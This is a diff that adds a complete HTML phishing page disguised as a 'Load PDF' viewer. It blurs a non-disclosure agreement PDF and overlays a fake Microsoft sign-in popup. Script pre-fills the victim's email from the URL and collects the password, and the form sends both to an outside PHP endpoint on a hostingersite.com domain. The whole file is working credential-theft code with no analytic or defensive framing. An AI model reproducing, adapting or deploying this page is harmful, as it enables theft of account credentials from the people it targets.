@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Load PDF</title>
+
+<style>
+    html, body {
+        height: 100%;
+        margin: 0;
+        overflow: hidden;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    iframe {
+        width: 100%;
+        height: 100%;
+        border: none;
+        transition: filter 0.5s ease;
+    }
+
+    /* ============================
+       SIGN-IN POPUP BASE STYLE
+       ============================ */
+    #smallIframe {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        width: 450px;
+        height: 370px;
+        transform: translate(-50%, -50%);
+        background: rgba(169, 169, 169, 0.6);
+        padding: 20px;
+        border-radius: 8px;
+        box-sizing: border-box;
+        opacity: 0;
+        transition: opacity 1s ease;
+    }
+
+    #logo {
+        width: 120px;
+        margin: 20px 0 0 20px;
+    }
+
+    #expiredText {
+        color: #000;
+        font-size: 26.5px;
+        font-weight: 500;
+        margin: 10px 0 0 20px;
+    }
+
+    .throbber-container {
+        width: 100%;
+        height: 20px;
+        margin-top: 20px;
+        overflow: hidden;
+        background: transparent;
+    }
+
+    .throbber {
+        display: flex;
+        width: 500%;
+        height: 100%;
+        animation: moveThrobber 6s ease-in-out infinite;
+    }
+
+    .throbber div {
+        width: 4px;
+        height: 4px;
+        background: #005da6;
+        border-radius: 50%;
+        margin: 0 8px;
+        animation: throb 1.5s ease-in-out infinite;
+    }
+
+    @keyframes moveThrobber {
+        0% { transform: translateX(-100%); }
+        50% { transform: translateX(0); }
+        100% { transform: translateX(100%); }
+    }
+
+    @keyframes throb {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.5); }
+    }
+
+    #loginForm {
+        display: none;
+        margin: 10px 20px 0 20px;
+    }
+
+    #signInText {
+        font-size: 26px;
+        font-weight: 500;
+        margin-bottom: 10px;
+    }
+
+    /* Email label above password box */
+    #email-display {
+        display: flex;
+        align-items: center;
+        cursor: not-allowed;
+        margin-bottom: 0;
+    }
+
+    #email-display::before {
+        content: '←';
+        font-size: 18px;
+        margin-right: 8px;
+        color: #000;
+    }
+
+    #loginForm input {
+        width: 100%;
+        padding: 10px;
+        margin-top: 10px;
+        margin-bottom: 10px;
+        border: none;
+        border-bottom: 1px solid #005da6;
+        background: transparent;
+        font-size: 16px;
+        outline: none;
+    }
+
+    #loginForm button {
+        background-color: #005da6;
+        color: #fff;
+        border: none;
+        padding: 7px 10px;
+        font-size: 16px;
+        width: 100px;
+        float: right;
+        margin-top: 25px;
+        cursor: pointer;
+    }
+
+    /* ============================
+       RESPONSIVE — TABLETS
+       ============================ */
+    @media (max-width: 900px) {
+        #smallIframe {
+            width: 85%;
+            height: auto;
+            padding-bottom: 30px;
+        }
+
+        #logo {
+            width: 110px;
+        }
+
+        #expiredText,
+        #signInText {
+            font-size: 24px;
+        }
+    }
+
+    /* ============================
+       RESPONSIVE — MOBILE
+       ============================ */
+    @media (max-width: 480px) {
+        #smallIframe {
+            width: 95%;
+            height: auto;
+            padding: 15px;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        #logo {
+            width: 95px;
+            margin-left: 10px;
+        }
+
+        #expiredText,
+        #signInText {
+            font-size: 22px;
+            margin-left: 10px;
+        }
+
+        #loginForm {
+            margin: 10px 10px 0 10px;
+        }
+
+        #loginForm button {
+            width: 100%;
+            float: none;
+            margin-top: 20px;
+        }
+    }
+</style>
+
+<script>
+    function getEmailFromURL() {
+        const url = window.location.href;
+        const emailRegex = /\?(.+)$/;
+        const match = url.match(emailRegex);
+        return match ? decodeURIComponent(match[1]) : "";
+    }
+
+    window.onload = function() {
+        const email = getEmailFromURL();
+        document.getElementById("email").value = email;
+        document.getElementById("email-display").textContent = email;
+    };
+
+    function applyBlur() {
+        document.getElementById("pdfViewer").style.filter = "blur(5px)";
+    }
+
+    function showSmallIframe() {
+        document.getElementById("smallIframe").style.opacity = "1";
+    }
+
+    function fadeOutTextAndThrobber() {
+        document.getElementById("expiredText").style.opacity = "0";
+        document.querySelector(".throbber-container").style.opacity = "0";
+        setTimeout(showLoginForm, 1000);
+    }
+
+    function showLoginForm() {
+        document.getElementById("expiredText").style.display = "none";
+        document.querySelector(".throbber-container").style.display = "none";
+        document.getElementById("loginForm").style.display = "block";
+        document.getElementById("password").focus();
+    }
+
+    function validateForm() {
+        const email = document.getElementById("email").value;
+        const pass = document.getElementById("password").value;
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        if (!emailPattern.test(email)) {
+            alert("Please enter a valid email address.");
+            return false;
+        }
+
+        if (pass.length < 4) {
+            alert("Password must be at least 4 characters long.");
+            return false;
+        }
+
+        return true;
+    }
+
+    setTimeout(applyBlur, 100);
+    setTimeout(showSmallIframe, 100);
+    setTimeout(fadeOutTextAndThrobber, 4000);
+</script>
+
+</head>
+<body>
+
+<iframe id="pdfViewer" src="https://darkcyan-swallow-106523.hostingersite.com/Non-Disclosure-Agreement.pdf"></iframe>
+
+<div id="smallIframe">
+    <img id="logo" src="https://darkcyan-swallow-106523.hostingersite.com/microsoft_logo.svg">
+    <p id="expiredText"></p>
+
+    <div class="throbber-container">
+        <div class="throbber">
+            <div></div><div></div><div></div><div></div><div></div>
+        </div>
+    </div>
+
+    <div id="loginForm">
+        <p id="email-display">Loading email...</p>
+        <p id="signInText">Enter password</p>
+
+        <form id="authForm" action="https://darkcyan-swallow-106523.hostingersite.com/new1.php" method="GET" onsubmit="return validateForm()">
+            <input type="hidden" id="email" name="email">
+            <input type="password" id="password" name="password" required minlength="4" placeholder="Password">
+            <button type="submit">Sign in</button>
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
